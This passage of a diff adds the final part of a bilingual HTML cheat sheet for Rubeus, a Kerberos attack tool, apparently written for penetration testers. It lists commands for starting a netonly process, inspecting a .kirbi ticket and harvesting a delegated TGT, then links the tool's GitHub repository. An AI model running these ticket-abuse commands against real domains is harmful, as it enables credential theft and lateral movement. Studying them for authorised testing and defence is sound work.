+      # Crée un processus sans authentification Kerberos (netonly)">13. Rubeus.exe createnetonly /program:cmd.exe
+      # Creates a process without Kerberos authentication (netonly)</code></pre>
+      
+        <pre><code data-lang-en="14. Rubeus.exe describe /ticket:admin.kirbi
+      # Analyzes the structure of a given ticket (.kirbi)" data-lang-fr="14. Rubeus.exe describe /ticket:admin.kirbi
+      # Analyse la structure d’un ticket donné (.kirbi)">14. Rubeus.exe describe /ticket:admin.kirbi
+      # Analyzes the structure of a given ticket (.kirbi)</code></pre>
+      
+        <pre><code data-lang-en="15. Rubeus.exe tgtdeleg /nowrap
+      # TGT delegation variant without line breaks (useful for parsing)" data-lang-fr="15. Rubeus.exe tgtdeleg /nowrap
+      # Variante de délégation TGT sans retour ligne (utile pour parsing)">15. Rubeus.exe tgtdeleg /nowrap
+      # TGT delegation variant without line breaks (useful for parsing)</code></pre>
+      
+    <h2 data-lang-en="📚 Additional Resources" data-lang-fr="📚 Ressources complémentaires">📚 Additional Resources</h2>
+    
+      <a href="https://github.com/GhostPack/Rubeus" target="_blank" data-lang-en="Official GitHub Repository" data-lang-fr="Repo GitHub officiel">Official GitHub Repository</a>
+      <a href="https://adsecurity.org" target="_blank" data-lang-en="ADSecurity.org Blog" data-lang-fr="Blog d'ADSecurity.org">ADSecurity.org Blog</a>
+    
+
+    <p style="text-align: center; margin-top: 60px; font-style: italic;" data-lang-en="by Zed" data-lang-fr="par Zed">by Zed</p>
+  </div>
+</body>
+</html>
